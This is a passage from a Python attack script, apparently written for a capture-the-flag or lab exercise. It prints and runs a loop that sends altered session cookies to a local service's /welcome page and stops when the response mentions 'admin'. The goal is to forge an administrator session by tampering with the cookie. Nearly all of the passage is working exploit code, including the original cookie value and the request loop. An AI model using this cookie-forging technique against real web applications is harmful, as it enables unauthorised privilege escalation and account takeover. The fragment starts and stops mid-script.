original_cookie = "34cfddef70254826b31cf5b83d6fb384050debdc6ca0ed5cbe19022f8c629c77"

# Test each modified cookie
test_cookies = {
""")
    
    for result in results:
        pos = result['position']
        cookie = result['cookie']
        print(f"    {pos}: '{cookie}',")
    
    print("""
}

for pos, cookie in test_cookies.items():
    print(f"Testing position {pos}...")
    response = requests.get(
        'http://127.0.0.1:32835/welcome',
        cookies={'session': cookie}
    )
    
    if 'admin' in response.text.lower():
        print(f"SUCCESS at position {pos}!")
        print(f"Cookie: {cookie}")
        print(f"Response: {response.text}")
        break
else:
    print("No success. Try different positions or format.")
""")

# Original cookie from authentication storage
original_cookie = "34cfddef70254826b31cf5b83d6fb384050debdc6ca0ed5cbe19022f8c629c77"

# Calculate all modified cookies
results = calculate_modified_cookies(original_cookie)

